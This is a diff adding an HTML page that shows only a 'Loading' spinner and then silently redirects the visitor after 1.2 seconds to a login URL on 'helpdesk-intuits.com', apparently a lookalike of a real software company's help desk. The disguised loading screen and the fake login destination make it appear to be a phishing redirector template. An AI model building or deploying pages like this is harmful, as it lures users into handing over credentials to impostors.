@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #0a0a0a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .loader-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 28px;
+      animation: fadeIn 0.4s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    /* Spinning ring */
+    .spinner {
+      width: 72px;
+      height: 72px;
+      border: 4px solid rgba(255,255,255,0.08);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .label {
+      color: rgba(255,255,255,0.45);
+      font-size: 13px;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loader-wrapper">
+    <div class="spinner"></div>
+    <span class="label">Loading</span>
+  </div>
+
+  <script>
+    // ✏️ CHANGE THIS to wherever you want to redirect
+    const REDIRECT_URL = "https://helpdesk-intuits.com/login/";
+
+    // Delay in milliseconds before redirecting (1200 = 1.2 seconds)
+    const DELAY = 1200;
+
+    setTimeout(() => {
+      window.location.replace(REDIRECT_URL);
+    }, DELAY);
+  </script>
+
+</body>
+</html>
